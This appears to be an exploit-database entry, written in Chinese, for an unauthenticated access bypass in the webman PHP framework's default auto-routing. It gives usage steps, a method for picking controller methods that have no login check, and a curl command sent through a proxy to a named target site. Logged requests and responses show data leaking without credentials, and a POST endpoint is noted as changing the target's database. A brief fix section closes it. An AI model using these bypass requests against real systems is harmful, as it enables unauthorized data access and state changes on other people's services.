# webman 默认(自动)路由绕过路由级 AuthMiddleware —— 未授权直达控制器方法（通用）

- **code**: webman-默认-自动-路由绕过路由级-authmiddleware-未授权直达控制器方法-通用
- **kind**: poc
- **category**: auth-bypass
- **component**: webman (workerman/webman-framework) 默认自动路由
- **severity**: high
- **language**: python
- **source**: self
- **verified**: 1
- **verified_note**: 在 example-com 靶标（203.0.113.95 / example.com，webman+Pear Admin 博彩系统）上实测：GET /api/v1/agent/commission-rates 返回 {"code":10003,"message":"缺少认证信息"}（被 AuthMiddleware 拦），同一方法 GET /api/agent/commissionRates 零凭证返回 200 与完整代理佣金阶梯表（rate 1/5/10/15/20、currency U、scale 3）；/api/agent/calculateCommission?effectiveCount=5&directWinLoss=100000 返回 {"rate":20,"commission":"20000.000"}；/api/v1/agent/info 返回 10003 而 /api/agent/info 返回控制器方法体自带的 {"code":401,"message":"未登录"}，证明中间件被跳过、请求已进入方法体；/api/safetyController/info 返回 webman 404 作为路由存在性对照。无需任何认证，请求经 -x http://127.0.0.1:7892 --connect-to example.com:443:203.0.113.95:443 发送。已落库 vuln_id=12 / evidence_id=9。
- **path**: pocs/webman-默认-自动-路由绕过路由级-authmiddleware-未授权直达控制器方法-通用/webman_default_route_auth_bypass.md
- **tags**: webman,默认路由,自动路由,鉴权绕过,未授权访问,auth-bypass,php,workerman
- **created_at**: 2026-10-12T10:44:58.156Z
- **found_by**: exploit

## 描述

webman 默认(自动)路由开启时，未命中显式路由的请求不会带上只挂在显式路由上的鉴权中间件。因此同一控制器方法可用「自动路由路径」绕过路由级 AuthMiddleware 直达方法体，只要方法内没自己写登录校验就是未授权访问。含判定方法、静态筛方法脚本思路、实测样本与修复建议。

## 用法

```
1) 先判默认路由是否开启（见 content 的「判定是否开启默认路由」三条）；
2) 枚举目标控制器 public 方法，筛掉方法体内含 userId/未登录/admin() 等校验的，剩余即候选；
3) 按 /api/<controller>/<camelCaseAction> 形式请求（action 用 camelCase，控制器名首字母大写或不敏感）；
4) 与显式路由 /api/v1/<controller>/<dash-action> 做对照，一个被拦一个出数据即证明绕过；
5) POST 类候选（如 trigger/create/save）先只做"参数缺失"探测确认进入方法体，避免真实副作用。
注意：若后台插件侧注册了 Route::fallback(..., '<plugin>')，该插件默认路由关闭，打不动。
```

## 正文

```
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
webman 默认(自动)路由绕过路由级鉴权 —— 通用探测/利用模板

原理
====
webman 应用常见写法是把鉴权挂在【显式注册的路由】上，例如：

    Route::group('/api/v1', function () {
        Route::get('/agent/commission-rates', [AgentController::class, 'commissionRates']);
    })->middleware([app\middleware\AuthMiddleware::class]);

而 config/middleware.php 的全局中间件往往只放 Exception / Cors / RateLimit / Encryption，
**不含任何鉴权**。

webman 自 1.x 起默认开启「默认路由（自动路由）」：未命中显式路由时，会把路径按
    /<app>/<controller>/<action>   或   /<controller>/<action>
解析成  <应用命名空间>\controller\<Controller>Controller::<action>()。
关键点：**自动路由命中的请求不会带上只挂在显式路由上的那组中间件。**

于是同一个控制器方法有两条路径：
    A) /api/v1/agent/commission-rates   → 走显式路由 → AuthMiddleware 拦（401/自定义 code）
    B) /api/agent/commissionRates       → 走自动路由 → 中间件不生效，直达方法体
只要该方法体内没有自己写 `if (!$userId) return 401;`，B 就是**未授权访问**。

判定是否开启默认路由
====================
① 打一个只可能由控制器方法体回应（而非中间件回应）的路径：
     GET /api/<controller>/<action>            # camelCase action
   · 返回控制器自己的业务 JSON（如 {"code":401,"message":"未登录"}） → 默认路由开启，且已进入方法体
   · 返回 webman 404 HTML                                      → 默认路由关闭或控制器不存在
② 对照打 /<不存在的控制器>/<action>，应返回 404：
     GET /api/safetyController/info
③ 同一方法的显式路由路径做对照（应被中间件拦）：
     GET /api/v1/<controller>/<dash-action>

快速找目标：把控制器源码里所有 public 方法抽出来，筛掉方法体内含
    userId | 未登录 | admin\(\) | admin_id | checkLogin | isLogin
的方法 —— 剩下的就是"只靠中间件保护"的方法，即自动路由可零凭证直达的接口。
（附带的 ex_enum_methods.py 就是干这个的，PHP 版可直接复用。）

实测样本（example-com 靶标，2026-10-12）
======================================
通道：本机 Clash fake-ip 环境（*.example.com 解析到 198.18.0.x），必须
    curl -x http://127.0.0.1:7892 -k --connect-to example.com:443:203.0.113.95:443 https://example.com/...
Burp/Yakit：目标地址填 203.0.113.95:443、Host 头保留 example.com。

  GET /api/v1/agent/commission-rates
      -> 200 {"code":10003,"message":"缺少认证信息","data":null}          # 被中间件拦
  GET /api/agent/commissionRates
      -> 200 {"code":0,"message":"success","data":{"list":[
                {"effectiveCount":1,"rate":1},{"effectiveCount":2,"rate":5},
                {"effectiveCount":3,"rate":10},{"effectiveCount":4,"rate":15},
                {"effectiveCount":5,"rate":20}],"currency":"U","scale":3}}   # 绕过，真实数据

  GET /api/v1/agent/calculate-commission?effectiveCount=5&directWinLoss=100000
      -> 200 {"code":10003,...}
  GET /api/agent/calculateCommission?effectiveCount=5&directWinLoss=100000
      -> 200 {"code":0,"data":{"rate":20,"commission":"20000.000",...}}     # 绕过

  # 进方法体证明（该 401 出自控制器方法体自身）
  GET /api/v1/agent/info -> 200 {"code":10003,"message":"缺少认证信息"}
  GET /api/agent/info    -> 200 {"code":401,"message":"未登录","data":null}

  # 不存在控制器对照
  GET /api/safetyController/info -> 200 text/html webman 404 页

影响与延伸
==========
· 属"体系性"缺陷：所有只依赖中间件鉴权的业务接口都成为未授权接口（该靶标 app/controller 下
  285 个 public 方法中有 108 个方法体内无任何登录校验）。
· 自动路由通常也能打到 POST/写接口 —— 该靶标 /api/collector/trigger（POST，CollectorController::trigger）
  即零凭证可触发采集并 insert 开奖表，属未授权状态变更。
· **不能**用它直达管理后台插件控制器：若插件侧注册了 fallback
  （如 `Route::fallback(fn($r)=>response($r->uri().' not found',404), 'admin');`），
  该插件的默认路由即被关闭；且后台插件中间件 AccessControl 仍会按控制器所在 app 生效。

修复
====
· 启动处关闭默认路由：`Route::disableDefaultRoute();`（只保留显式注册路由）；
· 或把鉴权从"路由级中间件"下沉为**全局中间件**，不再依赖每条路由自己挂；
· 逐个给控制器方法补方法体内的身份校验（纵深防御，不要只信路由层）。

```
